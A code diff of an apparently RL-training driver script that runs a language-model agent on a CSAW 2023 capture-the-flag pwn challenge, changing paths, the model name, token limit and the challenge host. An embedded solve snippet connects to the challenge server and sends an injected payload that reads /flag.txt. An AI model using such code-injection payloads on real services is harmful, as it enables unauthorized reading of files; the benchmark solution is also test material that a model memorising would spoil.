@@ -8,7 +8,9 @@ import asyncio
 import sys
 from pathlib import Path
 
-sys.path.insert(0, str(Path(__file__).parent.parent.parent))
+_WORKER_ORCH_ROOT = Path(__file__).resolve().parent.parent.parent
+_VULRL_REPO_ROOT = _WORKER_ORCH_ROOT.parent
+sys.path.insert(0, str(_WORKER_ORCH_ROOT))
 
 from worker_router.models import RolloutRequest
 from worker_unit.rollout_executor import RolloutExecutor
@@ -21,7 +23,7 @@ python3 - <<'PY'
 import re
 import socket
 
-host, port = "my_first_pwnie", 31137
+host, port = "pwn.chal.csaw.io", 31137
 payload = 'open("/flag.txt").read()\\n'
 
 with socket.create_connection((host, port), timeout=30) as s:
@@ -53,19 +55,16 @@ async def main() -> int:
         max_steps=8,
         timeout=300,
         llm_endpoint="http://127.0.0.1:12345",
-        model_name="qwen2.5-1.5b",
+        model_name="qwen2.5-7b-instruct",
         temperature=0.2,
-        max_tokens=1024,
+        max_tokens=32000,
         metadata={
             "task_type": "nyu_ctf",
-            "ctfmix_root": str(
-                Path(__file__).parent.parent.parent / "benchmark" / "ctfmix"
-            ),
+            "ctfmix_root": str(_VULRL_REPO_ROOT / "benchmark" / "ctfmix"),
             "challenge_relative_path": "nyu_ctf/2023/CSAW-Quals/pwn/my_first_pwnie",
             "agent_type": "ctf",
             "agent_config_file": str(
-                Path(__file__).parent.parent.parent
-                / "worker_unit/agent/config/default_ctf.yaml"
+                _WORKER_ORCH_ROOT / "worker_unit/agent/config/default_ctf.yaml"
             ),
         },
     )
